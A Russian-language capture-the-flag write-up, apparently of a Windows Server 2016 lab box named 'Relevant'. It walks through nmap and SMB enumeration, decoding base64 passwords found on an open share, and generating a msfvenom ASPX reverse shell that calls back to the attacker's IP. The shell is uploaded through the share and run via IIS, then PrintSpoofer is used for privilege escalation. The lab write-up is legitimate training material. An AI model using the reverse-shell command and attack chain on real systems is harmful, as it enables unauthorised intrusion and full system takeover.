Запускаем стандартное nmap сканирование. Оно выполнялось дольше, чем обычно.
Видим несколько открытых портов, 80 - стандартный веб-сервер, все остальные - это насколько я знаю стандартная связка портов на windows сервере. Перейдем к изучению веб-сервера.

![](../images/Pasted%20image%2020260513231608.png)

Веб-сервер представляет собой стандартную страницу windows IIS. Следующим шагом пробежимся по возможным скрытым директориям через ffuf.

![](../images/Pasted%20image%2020260513231854.png)

В это время завершилось подробное сканирование nmap

```
# Nmap 7.95 scan initiated Wed May 13 19:20:32 2026 as: nmap -sS -p 80,135,139,445,3389,49663,49666,49667 -sV -sC -oA result --stats-every=5s 10.113.166.191
Nmap scan report for 10.113.166.191
Host is up (0.0093s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2026-05-12T19:10:59
|_Not valid after:  2026-11-11T19:10:59
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2026-05-13T19:21:27+00:00
|_ssl-date: 2026-05-13T19:22:07+00:00; 0s from scanner time.
49663/tcp open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h24m00s, deviation: 3h07m50s, median: 0s
| smb2-time: 
|   date: 2026-05-13T19:21:30
|_  start_date: 2026-05-13T19:10:58
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-05-13T12:21:29-07:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed May 13 19:22:07 2026 -- 1 IP address (1 host up) scanned in 94.69 seconds
```

Видим еще один http сервер. На нем всё абсолютно также, одностраничник со стандартной страницей, без популярных скрытых директорий, как и на стандартном 80 порте.

Ну отлично, переходим к изучению sambo. Видим три станадртные шары и одну пользовательскую, пробуем зайти.
```
└─$ smbclient -L //10.113.166.191 -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk
```

В этой директории один единственный файл - passwords.txt. Скачиваем его.
```
└─$ smbclient //10.113.166.191/nt4wrksv -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jul 26 01:46:04 2020
  ..                                  D        0  Sun Jul 26 01:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 19:15:33 2020

                7735807 blocks of size 4096. 5100633 blocks available
smb: \> get passwords.txt 
getting file \passwords.txt of size 98 as passwords.txt (0,1 KiloBytes/sec) (average 0,1 KiloBytes/sec)
```

Внутри файла две строки, они в кодировке base64. Раскодируем и смотрим что получилось.
```
└─$ cat passwords.txt
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk

base64:
Bob - !P@$$W0rD!123
Bill - Juw4nnaM4n420696969!$$$
```

Получить shell через psexec не удалось, недостаточно прав, поэтому попробуем открыть какой-нибудь файл из шары через веб-сервер.
Веб-сервер через порт 80 не может открыть файлы, а через порт 49663 открывает файлы, если обращаться к ним.

![](../images/Pasted%20image%2020260514002400.png)

Таким образом следующая наша задача, создать веб или реверс шелл, который работает на техническом стеке веб сервера, а именно на ASP.NET, это мы могли узнать из заголовка
```
X-Powered-By: ASP.NET
```

Создаем реверс шелл
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.113.125.64 LPORT=4444 -f aspx -o shell.aspx
```

Загружаем его в шару smb, запускаем слушателя и открываем файл на сервере.
Видим подключение на слушателя.

![](../images/Pasted%20image%2020260514003413.png)

Мы оказались в системе и теперь наша задача найти user.txt флаг.

![](../images/Pasted%20image%2020260514003556.png)

Отлично, флаг пользователя прочитали, теперь надо повысить права. Я нашел статью по эскалации привилегий windows https://juggernaut-sec.com/seimpersonateprivilege/

Смотрим какие расширенные права есть у пользователя. Это совпадает с тем, о чем говорили в статье, поэтому мы можем попробовать JuicyPotato.exe.

![](../images/Pasted%20image%2020260514004207.png)

Перекидываем нужные файлы и запускаем... Позже я понял, что антивирус сразу же удаляет этот файл и не дает запустить, поэтому я перешел к следующему эксплоиту PrintSpoofer.exe.

![](../images/Pasted%20image%2020260514005334.png)

Также перекинул файлы и запустил. Таким образом получил оболочку с максимальными правами.

![](../images/Pasted%20image%2020260514011350.png)

Читаем root флаг.

![](../images/Pasted%20image%2020260514011722.png)
